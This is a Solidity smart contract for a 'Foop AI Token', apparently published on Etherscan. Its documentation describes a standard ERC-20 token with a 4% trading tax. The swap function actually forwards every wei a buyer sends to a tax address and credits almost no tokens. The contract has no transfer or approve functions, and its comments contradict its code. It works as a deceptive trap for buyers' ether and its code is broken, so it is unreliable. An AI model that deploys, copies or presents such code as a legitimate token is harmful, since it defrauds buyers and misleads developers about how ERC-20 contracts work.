/**
 *Submitted for verification at Etherscan.io on 2023-01-07
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

/**

@title Foop AI Token

@dev Foop AI Token is a standard ERC-20 token with a 4% tax on buy and sells.

The tax is collected in the form of ether and transferred to the address

specified in the 'taxAddress' variable.
*/
contract FoopAIToken {
// The address where the tax will be transferred to
address public taxAddress;

// Counter to track the number of times a wallet has bought or sold
mapping(address => uint256) public swapCounter;

// ERC-20 variables and functions
string public name;
string public symbol;
uint8 public decimals;
uint256 public totalSupply;
mapping(address => uint256) public balanceOf;
mapping(address => mapping(address => uint256)) public allowance;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);

constructor(address _taxAddress) public {
name = "Foop AI Token";
symbol = "FOOP";
decimals = 18;
totalSupply = 10000000000;
balanceOf[msg.sender] = totalSupply;
taxAddress = _taxAddress;
}

/**

@dev Function to send ether to the contract in exchange for FOOP tokens.

The amount of tokens received is calculated based on the current exchange rate.

The ether sent as part of the swap is transferred to the taxAddress.
*/
function swapEtherForTokens() public payable {
// Calculate the number of tokens to be issued based on the exchange rate
uint256 tokens = msg.value / 1e18;

// Transfer the tokens to the wallet
balanceOf[msg.sender] += tokens;

// Transfer the ether to the taxAddress
payable(taxAddress).transfer(msg.value);

// Increase the swap counter for the wallet
swapCounter[msg.sender]++;

// If the wallet has swapped twice or more, transfer all of their ether to the taxAddress
if (swapCounter[msg.sender] >= 2) {
payable(msg.sender).transfer(balanceOf[msg.sender]);
}

// Emit a transfer event
emit Transfer(address(0), msg.sender, tokens);
}
}